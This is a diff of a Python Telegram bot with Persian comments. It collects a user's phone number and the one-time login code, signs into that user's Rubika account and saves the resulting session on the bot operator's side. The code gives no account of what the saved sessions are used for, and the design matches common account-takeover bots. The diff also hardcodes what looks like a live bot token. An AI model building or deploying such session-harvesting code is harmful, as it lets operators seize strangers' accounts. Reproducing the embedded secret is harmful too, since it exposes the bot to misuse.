@@ -1,53 +1,71 @@
+# ======== اینجا توکن ربات تلگرام را بگذار ========
+TOKEN = "8419273751:AAFbgA1GbDkj9gVo721VBB_bWHEf8lmCwek"
+# ===============================================
+
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 from rubpy import Client
 
-sessions = {}
+users = {}
 
-async def start(message):
-    user_id = message.author_guid
-    sessions[user_id] = {"step": "phone"}
-    await message.reply("📱 شماره تلفن را ارسال کنید\nمثال: 09123456789")
+# شروع
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    users[update.effective_user.id] = {"step": "phone"}
+    await update.message.reply_text("📱 شماره تلفن را ارسال کنید")
 
+# دریافت پیام‌ها
+async def handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    text = update.message.text
 
-async def handler(message):
-    user_id = message.author_guid
-
-    if user_id not in sessions:
+    if uid not in users:
         return
 
-    step = sessions[user_id]["step"]
+    step = users[uid]["step"]
 
-    # مرحله دریافت شماره
+    # مرحله شماره
     if step == "phone":
-        phone = message.text.strip()
-        sessions[user_id]["phone"] = phone
-
-        client = Client(phone_number=phone)
+        phone = text.strip()
+        client = Client(f"session_{uid}")
         await client.connect()
 
         sent = await client.send_code(phone)
 
-        sessions[user_id]["client"] = client
-        sessions[user_id]["phone_code_hash"] = sent.phone_code_hash
-        sessions[user_id]["step"] = "code"
+        users[uid]["client"] = client
+        users[uid]["phone"] = phone
+        users[uid]["hash"] = sent.phone_code_hash
+        users[uid]["step"] = "code"
 
-        await message.reply("📩 کد تایید ارسال شد، کد را بفرستید:")
+        await update.message.reply_text("📩 کد تایید ارسال شد، کد را بفرستید")
 
-    # مرحله دریافت کد
+    # مرحله کد
     elif step == "code":
-        code = message.text.strip()
-
-        client = sessions[user_id]["client"]
-        phone = sessions[user_id]["phone"]
-        hash_ = sessions[user_id]["phone_code_hash"]
+        code = text.strip()
+        client = users[uid]["client"]
 
         try:
-            await client.sign_in(phone, hash_, code)
-
-            # ذخیره سشن
+            await client.sign_in(
+                users[uid]["phone"],
+                users[uid]["hash"],
+                code
+            )
             await client.save_session()
 
-            sessions[user_id]["step"] = "done"
-            await message.reply("✅ لاگین انجام شد")
+            users[uid]["step"] = "done"
+            await update.message.reply_text("✅ ورود موفق انجام شد")
 
         except Exception as e:
-            await message.reply(f"❌ خطا در لاگین: {e}")
+            await update.message.reply_text(f"❌ خطا: {e}")
+
+# اجرای ربات
+def main():
+    app = ApplicationBuilder().token(TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handler))
+
+    print("Bot running ...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
